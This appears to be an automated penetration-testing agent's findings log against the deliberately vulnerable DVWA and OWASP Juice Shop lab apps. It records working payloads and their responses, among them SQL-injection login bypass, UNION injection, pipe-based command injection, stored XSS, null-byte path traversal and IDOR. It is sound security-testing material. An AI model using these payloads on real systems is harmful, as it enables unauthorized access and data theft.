state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: Security control page. Current level=low. Form POST with security select (low/medium/high/impossible), submit name seclev_submit=Submit, and CSRF hidden user_token=[REDACTED] Used to change security level for level-specific vuln instances.

High-security SQLi render page. No inline form (replaced by 'Click here to change your ID' link to session-input.php). After POSTing id out-of-band to session-input.php, GET this page renders First name/Surname results from session-stored id. Security Level: high confirmed.

High-security OS command injection. Form POST to /vulnerabilities/exec/ with ip (text) + Submit=Submit. No user_token on this form. At high, blacklist strips '; ', '| ' (pipe+space), '&&' etc; bypass with pipe without trailing space e.g. 127.0.0.1|whoami. Confirm output contains www-data. Security Level: high confirmed.

High-security Stored XSS guestbook. POST txtName (maxlength=10), mtxMessage (textarea, maxlength=50), btnSign=Sign Guestbook (submit). At high, txtName is filtered via preg_replace on <script> but mtxMessage path differs; canary <script id="test_token">window.xss_flag=1</script> (46 chars, fits maxlength=50) goes in mtxMessage. Note maxlength is client-side only and may be bypassable server-side. Verify via browser_navigate + browser_eval_js(window.xss_flag). Security Level: high confirmed.

BOLA/IDOR: GET /rest/basket/<id> returns basket contents by numeric ID with no owner check. acct1 session_info.own_basket_id=6. Requesting /rest/basket/1 (another user's basket) returned HTTP 200 with that basket's distinct products: Apple Juice (1000ml) qty=2, Orange Juice (1000ml) qty=3, Eggfruit Juice (500ml) qty=1. Verifier should auth as juiceshop_acct2 and GET /rest/basket/6 to retrieve acct1's seeded items cross-user.

Open directory listing at /ftp/ (HTTP 200, Accept: text/html,application/json). Listing includes acquisitions.md (909 bytes), legal.md, coupons_2013.md.bak, package.json.bak, incident-support.kdbx, announcement_encrypted.md. acquisitions.md is listed and directly retrievable at /ftp/acquisitions.md for CWE-200 confidential document disclosure.
Confidential acquisitions memo listed in /ftp/ dir listing (909 bytes). Direct retrieval expected HTTP 200 with memo text; not yet fetched to avoid full exploit.
Login REST endpoint. JSON body {email, password}. Auth-bypass SQLi candidate: email=' OR 1=1-- should return token for first user admin@juice-sh.op. Not yet exploited.

GET /rest/products/search?q= observed returning HTTP 200 product JSON for q=apple. SQLi candidate: q=qwert' triggers SQLITE_ERROR 500; 9-col UNION (x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returns 200. Not yet exploited.

Unauthenticated GET /api/Feedbacks returns HTTP 200 with 8 feedback records. Comments embed author emails (partially masked in UI but PII present, e.g. ...in@juice-sh.op, ...ereum@juice-sh.op) tied to UserId. Discloses author email PII without auth (CWE-359).

package.json.bak (4291 bytes) listed in /ftp/. Raw path /ftp/package.json.bak returns HTTP 403 (restricted .bak ext); poison null-byte bypass /ftp/package.json.bak%2500.md expected HTTP 200 with file content (CWE-22). coupons_2013.md.bak also present as alternate target. Not yet exploited.
Browsable directory /encryptionkeys/ returns HTTP 200 with listing exposing sensitive key files: jwt.pub (248 bytes) and premium.key (50 bytes). Confirms CWE-548 exposed encryption-keys directory.

[security=medium] SQLi form is now method=POST (changed from GET at low). Field `id` is a <select> dropdown (values 1-5) + submit button `Submit`. Quotes are server-side escaped (mysqli_real_escape_string) so string injection via quotes fails; a NUMERIC boolean is required. Verifier payloads: TRUE `1 OR 1=1`, FALSE `1 AND 1=2` sent as POST id field (bypass dropdown by posting raw value). Confirmed via multiple seeded surnames on TRUE vs zero on FALSE. Current user_token: [REDACTED] (SQLi form has no token).

High-security SQLi out-of-band input: POST id via session-input.php (stored in session), then results render on GET /vulnerabilities/sqli/. Query appends LIMIT 1 so trailing comment required, e.g. 1' OR '1'='1' #. Form fields: id (text, no maxlength), Submit=Submit. Confirmed Security Level: high on page.

findings.title: Confidential Document (acquisitions.md) via Open Directory Listing at /ftp/
request_sequence: GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json) -> HTTP 200 directory listing including acquisitions.md (909 bytes)
findings.response_evidence:
Unauthenticated GET /ftp/ returned a browsable directory listing (HTTP 200) exposing acquisitions.md (909 bytes) among legal.md, coupons_2013.md.bak, package.json.bak, incident-support.kdbx, etc. Direct GET /ftp/acquisitions.md (HTTP 200, text/markdown) returned the confidential memo: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact... Our shareholders will be excited. It's true. No fake news." Confidential acquisition document disclosed without authentication.

findings.title: Login Authentication-Bypass SQL Injection at POST /rest/user/login
findings.response_evidence: POST /rest/user/login with email=' OR 1=1-- and arbitrary password returned HTTP 200 with a valid authentication token for the FIRST user: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi closes the query and matches all rows, authenticating as admin@juice-sh.op (umail confirms first user) without valid credentials — full authentication bypass.

findings.title: Product-Search SQL Injection (SQLITE_ERROR + 9-column UNION)
findings.response_evidence: Request 1 q=qwert' => HTTP 500, body: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error OWASP Juice Shop (Express ^4.17.1) 500\" — confirms unsanitized single quote breaks SQL syntax. Request 2 q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- => HTTP 200, body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — the injected UNION constants (1-9) are reflected into the result columns, proving a successful 9-column UNION injection returning attacker-controlled data without error.

findings.title: Exposed Encryption-Keys Directory (browsable listing of key files)
findings.response_evidence: HTTP 200 browsable directory listing. visible_text: \"listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM\". Listing links expose sensitive key files: /encryptionkeys/jwt.pub (248 bytes) and /encryptionkeys/premium.key (50 bytes). Confirms CWE-548 exposed encryption-keys directory with premium.key and jwt.pub visible.

findings.title: Unauthenticated User-Feedback PII Exposure (partially masked author emails)
findings.response_evidence: HTTP 200 without authentication returning 8 feedback records with status:success. Each record exposes UserId plus a free-text comment that embeds the author's email in MASKED form, e.g. id=1 UserId=1 comment ends with \"(***in@juice-sh.op)\"; id=3 UserId=3 \"(***der@juice-sh.op)\"; id=4 UserId=21 \"(***ereum@juice-sh.op)\". The endpoint confirms unauthenticated disclosure of records tied to UserId and the juice-sh.op email domain, but the local-part of every email is masked with '***' so no complete/unmasked email address is recoverable from this endpoint alone. Strict criterion requires quoting a full exposed email address, which is not met here (only masked partials: ***in@juice-sh.op, ***ereum@juice-sh.op). Downgrading to inconclusive pending a path that reveals full addresses.

findings.title: Poison Null-Byte Path Traversal bypasses .bak extension filter under /ftp/
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak  ->  HTTP 403 (Error: Only .md and .pdf files are allowed!)
GET http://juiceshop:3000/ftp/package.json.bak%2500.md  ->  HTTP 200 application/octet-stream with full file contents
findings.response_evidence: Raw request GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown from routes/fileServer.js:55 (extension whitelist filter). The null-byte bypass GET /ftp/package.json.bak%2500.md (URL-encoded null byte %00 + allowed .md extension) returned HTTP 200 with the restricted backup file's actual contents. Excerpt: {"name":"juice-shop","version":"6.2.0-SNAPSHOT","description":"An intentionally insecure JavaScript Web Application",...,"dependencies":{"body-parser":"~1.18","express":"~4.16","express-jwt":"0.1.3","jsonwebtoken":"~8","sanitize-html":"1.4.2","sequelize":"~4","sqlite3":"~3.1.13"...}}. Both conditions (403 on raw path AND 200-with-content via null-byte bypass) observed.

findings.title: Unauthenticated /api/Feedbacks exposes feedback records but author emails are masked (no full PII recoverable)
request_sequence: GET http://juiceshop:3000/api/Feedbacks (unauth, no Authorization header)  ->  HTTP 200 with 8 feedback records
findings.response_evidence: Endpoint returns HTTP 200 WITHOUT any authentication (unauth session, no token), disclosing 8 feedback records (UserId, id, comment, rating, timestamps). However, every author email embedded in the comment field is server-side MASKED, not a full PII disclosure. Exact observed values: id1 UserId1 '...(***in@juice-sh.op)'; id2 UserId2 '...(***@juice-sh.op)'; id3 UserId3 '...(***der@juice-sh.op)'; id4 UserId21 '...(***ereum@juice-sh.op)'; ids 5-8 UserId null '(anonymous)'. The local-part before @ is replaced with '***', so no full/recoverable author email address is disclosed anywhere in the response (checked all comment fields and records). Only masked prefixes and the common domain @juice-sh.op are visible. Since no full email PII is recoverable, the CWE-359 full-PII-exposure criterion is NOT met. Verdict: rejected.

findings.title: SQL Injection (numeric boolean) in SQLi id field at DVWA medium security
findings.response_evidence: [security=medium] Page footer shows 'Security Level: medium'. TRUE payload id=`1 OR 1=1` returned 5 seeded user records: Surname admin (admin), Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload id=`1 AND 1=2` returned zero records (no First name/Surname blocks). Numeric boolean bypasses mysqli_real_escape_string quote escaping, proving injection.

findings.title: OS Command Injection via pipe separator in exec ip field at DVWA medium security

Payload ip=`127.0.0.1| whoami` produced command output pre-block containing the web-process identity `www-data`, confirming command execution.
